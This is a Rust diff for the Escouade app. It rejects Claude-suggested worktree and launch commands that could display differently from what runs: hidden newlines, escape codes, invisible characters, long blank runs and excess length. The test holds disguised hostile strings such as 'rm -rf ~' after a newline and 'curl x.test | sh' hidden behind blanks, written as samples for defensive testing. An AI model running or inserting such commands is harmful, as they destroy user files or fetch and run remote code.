@@ -21,11 +21,12 @@ pub const SUGGEST_LIMIT: Duration = Duration::from_secs(4 * 60);
 const MAX_SUGGESTED: usize = 8;
 /// A suggested launch command's name is cut at this many characters: it is shown in a row.
 const MAX_NAME: usize = 40;
-/// A suggested launch command is at most this many characters long: it is read in a field of the
-/// settings a little wider than 70, and a long one would push its end out of sight.
+/// A suggested command (a launch command, a worktree step) is at most this many characters long: it
+/// is read in a field of the settings a little wider than 70, and a long one would push its end out
+/// of sight.
 const MAX_COMMAND: usize = 300;
-/// A suggested launch command has no run of this many blanks or more (the window's own threshold
-/// in `recipe.ts`): the rest of the line would sit out of the field.
+/// A suggested command has no run of this many blanks or more (the window's own threshold in
+/// `recipe.ts`): the rest of the line would sit out of the field.
 const MAX_BLANKS: usize = 24;
 
 /// The variables a worktree's commands get: where the project and the worktree are, its branch,
@@ -154,12 +155,31 @@ pub async fn run_step(
 
 // ---------- suggested by Claude ----------
 
-/// The setup and teardown Claude suggests for a project's worktrees.
+/// The setup and teardown Claude suggests for a project's worktrees, and how many steps it gave that
+/// were refused for what they would hide in a field of the settings (`Entry::is_plain`).
 #[derive(Debug, Clone, Serialize, PartialEq, Default)]
 pub struct WorktreeSuggestion {
     pub setup: Vec<WorktreeStep>,
     pub teardown: Vec<WorktreeStep>,
+    /// The steps left out for not being one plain line, or for being too long: the others left out
+    /// (a folder that is none of the project's, nothing to run) are not counted. Those past the
+    /// `MAX_SUGGESTED` kept of a list are not looked at.
+    pub refused: usize,
 }
+
+/// What Claude is told of the form of a command, whichever suggestion: the settings show it on one
+/// line, and what is read there must be what runs.
+fn one_line_rule() -> String {
+    format!(
+        "Chaque commande tient sur une seule ligne, sans retour à la ligne ni suite de {MAX_BLANKS} espaces ou plus, \
+         et sur {MAX_COMMAND} caractères au plus, sans quoi elle est écartée \
+         (un enchaînement plus long va dans un script du projet, que la commande appelle)."
+    )
+}
+
+/// What a suggestion fails with when it gave commands, none of which could be shown as they would
+/// run: not the same as having found nothing to launch.
+pub const ALL_REFUSED: &str = "Claude a proposé des commandes illisibles : aucune n'a été gardée.";
 
 /// Claude's role when it suggests a project's worktree commands.
 pub const SUGGEST_SYSTEM: &str = "Tu lis un projet pour préparer les commandes qu'Escouade lance dans ses worktrees git. Tu ne modifies rien et n'exécutes rien : tu lis les fichiers, puis tu réponds uniquement par le bloc JSON demandé.";
@@ -183,6 +203,7 @@ pub fn suggest_prompt(shell: &str, copied: &[String], isola: bool) -> String {
     } else {
         ""
     };
+    let one_line = one_line_rule();
     format!(
         "<worktrees>\nChaque agent d'Escouade travaille dans un nouveau worktree git de ce projet : un checkout neuf de la branche, \
          sans dépendances installées ni rien de généré, avec {copied}.{isola}\n\n\
@@ -193,7 +214,7 @@ pub fn suggest_prompt(shell: &str, copied: &[String], isola: bool) -> String {
          composer install, go mod download…) dans chaque dossier qui en a, puis ce que le build ou les tests exigent d'avance (code généré, \
          client Prisma…). Jamais de serveur ni de commande qui ne se termine pas, ni de tests, ni de build qui n'est pas nécessaire.\n\
          - « demontage » : seulement ce qu'il faut défaire hors du worktree avant de le supprimer (base de données ou conteneurs créés \
-         pour lui) ; le plus souvent rien.\n\n\
+         pour lui) ; le plus souvent rien. {one_line}\n\n\
          Les commandes tournent dans {shell}, chacune dans le dossier « dossier » (relatif à la racine du worktree, vide pour la racine). \
          Variables disponibles : ESCOUADE_PROJECT_DIR (dossier du projet principal), ESCOUADE_WORKTREE_DIR, ESCOUADE_BRANCH.\n\n\
          Réponds uniquement par :\n```json\n{{\"preparation\": [{{\"commande\": \"npm ci\", \"dossier\": \"\"}}], \"demontage\": []}}\n```\n</worktrees>"
@@ -227,86 +248,7 @@ fn candidates(text: &str) -> Vec<&str> {
     blocks
 }
 
-/// What the answer says of one command: what it runs, in which folder, and the name it gives it.
-struct Entry {
-    command: String,
-    /// Relative to the project's folder, empty for the folder itself.
-    cwd: String,
-    /// Empty when it gives none.
-    name: String,
-}
-
-/// The entries of a list of the answer (a string alone is a command): those with a command whose
-/// folder stays inside `root` (the project's folder: the worktree's is the same tree).
-fn entries_of<'a>(list: Option<&'a Value>, root: &'a Path) -> impl Iterator<Item = Entry> + 'a {
-    list.and_then(Value::as_array)
-        .into_iter()
-        .flatten()
-        .filter_map(move |s| {
-            let text = |keys: &[&str]| {
-                keys.iter()
-                    .find_map(|k| s.get(*k).and_then(Value::as_str))
-                    .unwrap_or_default()
-                    .trim()
-                    .to_string()
-            };
-            let command = match s {
-                Value::String(c) => c.trim().to_string(),
-                _ => text(&["commande", "command"]),
-            };
-            if command.is_empty() {
-                return None;
-            }
-            let dir = text(&["dossier", "dir", "cwd"]);
-            let dir = dir.trim_start_matches("./").trim_end_matches(['/', '\\']);
-            let cwd = match dir {
-                "" | "." => String::new(),
-                d if paths::contained(root, d).is_ok() => d.to_string(),
-                _ => return None,
-            };
-            Some(Entry {
-                command,
-                cwd,
-                name: text(&["nom", "name"]),
-            })
-        })
-}
-
-/// The steps of a list of the answer, each run by `shell`.
-fn steps_of(list: Option<&Value>, root: &Path, shell: &str) -> Vec<WorktreeStep> {
-    entries_of(list, root)
-        .map(|e| WorktreeStep {
-            id: uuid::Uuid::new_v4().to_string(),
-            command: e.command,
-            shell: shell.to_string(),
-            cwd: e.cwd,
-        })
-        .take(MAX_SUGGESTED)
-        .collect()
-}
-
-/// The setup and teardown in Claude's `answer` (its JSON object with "preparation" and
-/// "demontage"), each step run by `shell`; None when no block of it reads as such.
-pub fn parse_suggestion(
-    answer: &str,
-    root: &Path,
-    shell: &str,
-) -> Option<(Vec<WorktreeStep>, Vec<WorktreeStep>)> {
-    candidates(answer).into_iter().find_map(|block| {
-        let v: Value = serde_json::from_str(block.trim()).ok()?;
-        let setup = v.get("preparation").or_else(|| v.get("setup"));
-        let teardown = v.get("demontage").or_else(|| v.get("teardown"));
-        if setup.is_none() && teardown.is_none() {
-            return None;
-        }
-        Some((
-            steps_of(setup, root, shell),
-            steps_of(teardown, root, shell),
-        ))
-    })
-}
-
-// ---------- launch commands suggested by Claude ----------
+// ---------- what the settings can show ----------
 
 /// The characters that show nothing, or change the order of what is shown: zero-width and
 /// direction marks, variation selectors, tag characters, the blank that is not a space… (the
@@ -370,6 +312,107 @@ fn plain_name(name: &str) -> String {
         .join(" ")
 }
 
+/// What the answer says of one command: what it runs, in which folder, and the name it gives it.
+struct Entry {
+    command: String,
+    /// Relative to the project's folder, empty for the folder itself.
+    cwd: String,
+    /// Empty when it gives none.
+    name: String,
+}
+
+impl Entry {
+    /// Whether what it runs and where can be read whole in the one-line fields of the settings: its
+    /// command is one plain line of `MAX_COMMAND` characters at most, and so is its folder.
+    fn is_plain(&self) -> bool {
+        self.command.chars().count() <= MAX_COMMAND
+            && is_plain_line(&self.command)
+            && is_plain_line(&self.cwd)
+    }
+}
+
+/// The entries of a list of the answer (a string alone is a command): those with a command whose
+/// folder stays inside `root` (the project's folder: the worktree's is the same tree).
+fn entries_of<'a>(list: Option<&'a Value>, root: &'a Path) -> impl Iterator<Item = Entry> + 'a {
+    list.and_then(Value::as_array)
+        .into_iter()
+        .flatten()
+        .filter_map(move |s| {
+            let text = |keys: &[&str]| {
+                keys.iter()
+                    .find_map(|k| s.get(*k).and_then(Value::as_str))
+                    .unwrap_or_default()
+                    .trim()
+                    .to_string()
+            };
+            let command = match s {
+                Value::String(c) => c.trim().to_string(),
+                _ => text(&["commande", "command"]),
+            };
+            if command.is_empty() {
+                return None;
+            }
+            let dir = text(&["dossier", "dir", "cwd"]);
+            let dir = dir.trim_start_matches("./").trim_end_matches(['/', '\\']);
+            let cwd = match dir {
+                "" | "." => String::new(),
+                d if paths::contained(root, d).is_ok() => d.to_string(),
+                _ => return None,
+            };
+            Some(Entry {
+                command,
+                cwd,
+                name: text(&["nom", "name"]),
+            })
+        })
+}
+
+/// The steps of a list of the answer, each run by `shell`, and how many were refused as not plain.
+fn steps_of(list: Option<&Value>, root: &Path, shell: &str) -> (Vec<WorktreeStep>, usize) {
+    let mut steps = Vec::new();
+    let mut refused = 0;
+    for e in entries_of(list, root) {
+        if steps.len() == MAX_SUGGESTED {
+            break;
+        }
+        if !e.is_plain() {
+            refused += 1;
+            continue;
+        }
+        steps.push(WorktreeStep {
+            id: uuid::Uuid::new_v4().to_string(),
+            command: e.command,
+            shell: shell.to_string(),
+            cwd: e.cwd,
+        });
+    }
+    (steps, refused)
+}
+
+/// The setup and teardown in Claude's `answer` (its JSON object with "preparation" and
+/// "demontage"), each step run by `shell`; None when no block of it reads as such. A step whose
+/// folder is none of the project's is left out; one whose text is not one plain line, or too long,
+/// is refused and counted.
+pub fn parse_suggestion(answer: &str, root: &Path, shell: &str) -> Option<WorktreeSuggestion> {
+    candidates(answer).into_iter().find_map(|block| {
+        let v: Value = serde_json::from_str(block.trim()).ok()?;
+        let setup = v.get("preparation").or_else(|| v.get("setup"));
+        let teardown = v.get("demontage").or_else(|| v.get("teardown"));
+        if setup.is_none() && teardown.is_none() {
+            return None;
+        }
+        let (setup, refused_setup) = steps_of(setup, root, shell);
+        let (teardown, refused_teardown) = steps_of(teardown, root, shell);
+        Some(WorktreeSuggestion {
+            setup,
+            teardown,
+            refused: refused_setup + refused_teardown,
+        })
+    })
+}
+
+// ---------- launch commands suggested by Claude ----------
+
 /// Claude's role when it suggests a project's launch commands.
 pub const RUN_SUGGEST_SYSTEM: &str = "Tu lis un projet pour préparer les commandes qu'Escouade lance pour le développer (serveurs de développement, watchers…). Tu ne modifies rien et n'exécutes rien : tu lis les fichiers, puis tu réponds uniquement par le bloc JSON demandé.";
 
@@ -384,6 +427,7 @@ pub fn run_suggest_prompt(shell: &ShellInfo) -> String {
         "PORT=3000 npm run dev"
     };
     let label = &shell.label;
+    let one_line = one_line_rule();
     format!(
         "<lancement>\nL'utilisateur lance les processus dont il a besoin pour développer ce projet depuis la section « Lancement » d'Escouade : \
          chaque commande tourne dans son propre terminal, qu'il garde ouvert pendant qu'il travaille.\n\n\
@@ -393,9 +437,7 @@ pub fn run_suggest_prompt(shell: &ShellInfo) -> String {
          Une commande par processus, avec un nom court (« Front », « API », « Base »). Une commande qui rend la main aussitôt \
          (docker compose up -d) ne se suit pas dans un terminal : donne-la au premier plan (docker compose up db).\n\
          Jamais de commande d'installation ni de tests, ni de commande qui se termine d'elle-même (build, lint, migration). \
-         Au plus {MAX_SUGGESTED} commandes, aucune si le projet n'a rien à lancer. Chaque commande tient sur une seule ligne, sans retour à la ligne \
-         ni suite de {MAX_BLANKS} espaces ou plus, et sur {MAX_COMMAND} caractères au plus, sans quoi elle est écartée \
-         (un enchaînement plus long va dans un script du projet, que la commande appelle).\n\n\
+         Au plus {MAX_SUGGESTED} commandes, aucune si le projet n'a rien à lancer. {one_line}\n\n\
          Les commandes tournent dans {label}, chacune dans le dossier « dossier » (relatif à la racine du projet, vide pour la racine). \
          Aucune variable d'Escouade (ESCOUADE_…) n'est définie pour elles : si un processus exige une variable d'environnement qu'il ne lit pas \
          lui-même dans un fichier .env, écris-la devant la commande, avec la syntaxe de {label} ({set_variable}).\n\n\
@@ -430,10 +472,7 @@ pub fn parse_run_suggestion(answer: &str, root: &Path, shell: &str) -> Option<Ru
             if out.commands.len() == MAX_SUGGESTED {
                 break;
             }
-            if e.command.chars().count() > MAX_COMMAND
-                || !is_plain_line(&e.command)
-                || !is_plain_line(&e.cwd)
-            {
+            if !e.is_plain() {
                 out.refused += 1;
             } else if e.cwd.is_empty() || root.join(&e.cwd).is_dir() {
                 let name = plain_name(&e.name);
@@ -569,7 +608,12 @@ mod tests {
             {\"commande\": \"  \", \"dossier\": \"web\"},\
             \"cargo fetch\"],\
             \"demontage\": [{\"commande\": \"docker compose down\", \"dossier\": null}]}\n```";
-        let (setup, teardown) = parse_suggestion(answer, &root, "bash").unwrap();
+        let WorktreeSuggestion {
+            setup,
+            teardown,
+            refused,
+        } = parse_suggestion(answer, &root, "bash").unwrap();
+        assert_eq!(refused, 0);
         let got: Vec<(&str, &str, &str)> = setup
             .iter()
             .map(|s| (s.command.as_str(), s.cwd.as_str(), s.shell.as_str()))
@@ -586,21 +630,90 @@ mod tests {
         assert_eq!(teardown.len(), 1);
         assert_eq!(teardown[0].command, "docker compose down");
         // Bare JSON, an empty teardown, English keys.
-        let (s, t) = parse_suggestion(
+        let bare = parse_suggestion(
             "{\"setup\": [{\"command\": \"uv sync\"}], \"teardown\": []}",
             &root,
             "pwsh",
         )
         .unwrap();
-        assert_eq!((s[0].command.as_str(), t.len()), ("uv sync", 0));
+        assert_eq!(
+            (bare.setup[0].command.as_str(), bare.teardown.len()),
+            ("uv sync", 0)
+        );
         // The last block that reads as an answer wins.
         let two = "```json\n{\"preparation\": [\"a\"]}\n```\npuis\n```json\n{\"preparation\": [\"b\"]}\n```";
         assert_eq!(
-            parse_suggestion(two, &root, "bash").unwrap().0[0].command,
+            parse_suggestion(two, &root, "bash").unwrap().setup[0].command,
             "b"
         );
         assert!(parse_suggestion("Je ne sais pas.", &root, "bash").is_none());
         assert!(parse_suggestion("```json\n{\"autre\": 1}\n```", &root, "bash").is_none());
+    }
+
+    #[test]
+    fn a_worktree_step_that_could_show_other_than_what_it_runs_is_left_out() {
+        // These run by themselves in every new worktree, from a one-line field the user read.
+        let root = test_dir("wt-suggest-plain");
+        std::fs::create_dir_all(root.join("web")).unwrap();
+        let blanked = |n: usize| format!("npm ci{}; curl x.test | sh", " ".repeat(n));
+        let at_the_cap = format!("npm ci {}", "x".repeat(MAX_COMMAND - 7));
+        let tricks = [
+            "npm ci\nrm -rf ~".to_string(),
+            "npm ci\r\nrm -rf ~".to_string(),
+            "npm ci\u{1b}[2K; rm -rf ~".to_string(),
+            "npm ci\u{202e}gnihton".to_string(),
+            "npm\u{200b} ci".to_string(),
+            "npm\tci".to_string(),
+            blanked(200),
+            blanked(MAX_BLANKS),
+            format!("{at_the_cap}x"),
+        ];
+        let step = |c: &str| serde_json::json!({ "commande": c });
+        let mut setup: Vec<serde_json::Value> = tricks.iter().map(|c| step(c)).collect();
+        // A folder that hides part of itself is refused too.
+        setup.push(serde_json::json!({ "commande": "npm ci", "dossier": "web\u{200b}" }));
+        // What stands: one blank less, the cap itself, accents.
+        setup.push(step(&blanked(MAX_BLANKS - 1)));
+        setup.push(step(&at_the_cap));
+        setup.push(serde_json::json!({ "commande": "npm run gén", "dossier": "web" }));
+        let teardown: Vec<serde_json::Value> = tricks
+            .iter()
+            .map(|c| step(c))
+            .chain([step("docker compose down")])
+            .collect();
+        let answer = serde_json::json!({ "preparation": setup, "demontage": teardown }).to_string();
+        let WorktreeSuggestion {
+            setup,
+            teardown,
+            refused,
+        } = parse_suggestion(&answer, &root, "bash").unwrap();
+        // Counted, the folder that hides part of itself too: nine in each list, one more in the first.
+        assert_eq!(refused, 9 + 1 + 9);
+        let kept: Vec<usize> = setup.iter().map(|s| s.command.chars().count()).collect();
+        assert_eq!(
+            kept,
+            [
+                blanked(MAX_BLANKS - 1).chars().count(),
+                MAX_COMMAND,
+                "npm run gén".chars().count()
+            ]
+        );
+        assert_eq!(setup[2].cwd, "web");
+        let down: Vec<&str> = teardown.iter().map(|s| s.command.as_str()).collect();
+        assert_eq!(down, ["docker compose down"]);
+        // All refused: an answer all the same, with nothing kept, and the count to say so.
+        let all = serde_json::json!({
+            "preparation": ["npm ci\nrm -rf ~"],
+            "demontage": ["a\u{200b}b"],
+        })
+        .to_string();
+        let none = parse_suggestion(&all, &root, "bash").unwrap();
+        assert_eq!(
+            (none.setup.len(), none.teardown.len(), none.refused),
+            (0, 0, 2)
+        );
+        // Sent to the window with the count.
+        assert_eq!(serde_json::to_value(&none).unwrap()["refused"], 2);
     }
 
     #[test]
@@ -610,6 +723,13 @@ mod tests {
         assert!(!p.contains("isola"));
         assert!(suggest_prompt("bash", &[], true).contains(".isola.toml"));
         assert!(suggest_prompt("bash", &[], false).contains("aucun fichier ignoré par git"));
+        // One command per line, short, with no long run of blanks: what the settings can show.
+        assert!(
+            p.contains("sur une seule ligne, sans retour à la ligne")
+                && p.contains("300 caractères au plus")
+                && p.contains("24 espaces ou plus"),
+            "{p}"
+        );
     }
 
     fn shell_of(id: &str, label: &str) -> ShellInfo {
